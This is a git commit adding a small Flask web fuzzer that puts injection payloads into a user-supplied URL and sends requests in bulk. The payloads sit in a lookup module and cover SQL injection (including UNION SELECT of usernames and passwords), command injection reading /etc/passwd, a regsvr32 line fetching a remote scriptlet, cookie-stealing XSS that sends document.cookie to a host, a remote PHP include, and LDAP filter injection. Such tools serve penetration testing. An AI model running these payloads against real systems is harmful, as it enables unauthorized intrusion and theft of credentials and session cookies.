35e40581dbc6cfc4d7070a79a26e158c2ff1ee5f
ryancor <ryan_cornateanu@yahoo.com>
2017-09-18 16:18:08 -0700

    json returns value

---
+++ app.py
@@ -0,0 +1,55 @@
+import time
+import requests
+from flask import Flask, render_template, request, json
+from services.injections import Injections
+
+app = Flask(__name__)
+
+@app.route('/')
+def main():
+	return render_template('index.html')
+	
+@app.route('/', methods=['GET','POST'])
+def fuzz_post():
+	end_point = request.form['text']
+	request_case = request.form['options']
+	data = {}
+	
+	for arr in Injections.sql_injections():
+		try:
+			time.sleep(1)
+
+			if '[]' in end_point:
+				new_ep = end_point.replace('[]', arr)
+
+				if request_case == 'GET':
+					r = requests.get(new_ep)
+				elif request_case == 'POST':
+					r = requests.post(new_ep)
+				elif request_case == 'PUT':
+					r = requests.put(new_ep)
+				elif request_case == 'DELETE':
+					r = requests.delete(new_ep)
+				else:
+					return request_case
+					break
+				
+				data.setdefault("Results",[]).append([
+					request_case, 
+					new_ep, 
+					r.status_code
+					]
+				)
+
+			else:
+				return '\n[-] Not fuzzable.'
+				break
+
+		except Exception as error:
+			return '\n[-] Could not make a successful request to that endpoint. {0}'.format(error)
+  
+	results = json.dumps(data)
+	return render_template("results.html", results=results)
+
+if __name__ == '__main__':
+	app.run()
---
+++ services/injections.py
@@ -0,0 +1,72 @@
+class Injections():
+    def injection_options():
+        injection_type = input('\n[!] What type of injection do you want?\
+        (Options: SQL, Command, XSS, RCE, LDAP, LFI, Fuzzer, Full DAST, Url Snooper)\
+        \n-> ')
+
+        return injection_type
+
+    def sql_injections():
+        sql_injections = ['0x200', "' OR 'a'='a", '*/*', "') or \
+        (SELECT admin FROM users WHERE admin = true AND ''='",
+        "'UNION ALL SELECT username, password FROM members WHERE admin=1--'"]
+
+        return sql_injections
+
+    def command_injections():
+        command_injections = ['../../etc/passwd', '; cat /etc/passwd',
+            '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
+            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll"]
+
+        return command_injections
+
+    def xss_injections():
+        xss_injections = ["<script>alert('hacked')</script>",
+        "<iframe src='http://cnn.com'></iframe>",
+        "<script>window.location.href =\
+        'https://www.dropbox.com/s/ewbk6o8lttcd4t4/Get%20Started%20with%20Dropbox.pdf?dl=1'\
+        </script>", "<script>/* */var i=new Image();/* */i.src=\
+        'http://localhost:3000/search?utf8=%E2%9C%93&query='+document.cookie+'\
+        &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
+        ""]
+
+        return xss_injections
+
+    def rce_injections():
+        rce_injections = ["http://evilsite.com/evilcode.php", "; system('id')"]
+
+        return rce_injections
+
+    def ldap_injections():
+        ldap_injections = ["*/*","admin*)((|userpassword=*)",
+        "page_location=crypts)(rank=*))(&(page_location=crypts",
+        "(&(USER = root)(&)","(&(cn=hacker)(cn=*))%00)(userPassword=[pass]))"]
+
+        return ldap_injections
+
+    def dast_scan():
+        dast_scan = ['../../etc/passwd', '; cat /etc/passwd',
+            '<!--#exec cmd="ls ../"-->',"|| regsvr32 /s /n /u /\
+            i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll", "<script>alert\
+            ('hacked')</script>", "<iframe src='http://cnn.com'></iframe>",
+            "<script>window.location.href =\
+            'https://www.dropbox.com/s/ewbk6o8lttcd4t4/Get%20Started%20with%20Dropbox.pdf?dl=1'\
+            </script>", "<script>/* */var i=new Image();/* */i.src=\
+            'http://localhost:3000/search?utf8=%E2%9C%93&query='+document.cookie+'\
+            &commit=Go'/**/</script>","<<SCRIPT>alert('HackThis!!');//<</SCRIPT>",
+            '0x200', "' OR 'a'='a", '*/*', "') or \
+            (SELECT admin FROM users WHERE admin = true AND ''='",
+            "'UNION ALL SELECT username, password FROM members WHERE admin=1--'",
+            "*/*","admin*)((|userpassword=*)",
+            "page_location=crypts)(rank=*))(&(page_location=crypts",
+            "(&(USER = root)(&)","(&(cn=hacker)(cn=*))%00)(userPassword=[pass]))"]
+
+        return dast_scan
+
+    def url_snoop():
+        url_scan = ['.data', '.php', '.html', '.zip', '.exe', '.rb', '.py',
+            '.swf', '.xhtml', '.iso', '.sql', '.avi', '.css', '.doc', '.pdf',
+            '.gif', '.png', '.jpg', '.jpeg', '.midi', '.mov', '.mp3', '.tar.gz',
+            '.htm']
+
+        return url_scan
